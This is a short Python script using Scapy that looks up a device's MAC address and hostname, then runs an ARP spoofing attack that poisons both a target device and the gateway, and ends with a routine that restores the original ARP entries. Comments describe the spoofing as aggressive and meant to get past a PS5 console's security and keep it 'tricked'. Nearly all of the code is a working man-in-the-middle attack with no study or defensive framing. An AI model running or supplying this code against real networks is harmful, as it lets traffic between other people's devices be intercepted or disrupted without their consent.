import scapy.all as scapy
import socket
import time

def get_device_info(ip):
    """
    Retrieves both the MAC address and the Hostname of a device.
    """
    # 1. Get MAC Address via ARP
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)[0]

    mac = answered_list[0][1].hwsrc if answered_list else None
    
    # 2. Get Device Name via Reverse DNS
    try:
        # Standard lookup for names like 'PS5-LivingRoom' or 'Alo-PC'
        name = socket.gethostbyaddr(ip)[0]
    except (socket.herror, socket.timeout):
        name = "Unknown Device"

    return mac, name

def spoof(target_ip, gateway_ip, target_mac, gateway_mac):
    """
    Aggressive spoofing to bypass console security (PS5).
    Uses hwdst to stop Scapy destination warnings.
    """
    # Packet to target: "I am the router"
    target_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    
    # Packet to router: "I am the target"
    gateway_packet = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

    # Sending 4 packets at once ensures the PS5 stays 'tricked'
    scapy.send(target_packet, count=4, verbose=False)
    scapy.send(gateway_packet, count=4, verbose=False)

def restore(destination_ip, source_ip):
    """
    Restores the network connection to its original state.
    """
    dest_mac, _ = get_device_info(destination_ip)
    src_mac, _ = get_device_info(source_ip)
    
    if dest_mac and src_mac:
        # Send the correct REAL MAC address information back to the devices
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=src_mac)
        scapy.send(packet, count=5, verbose=False)
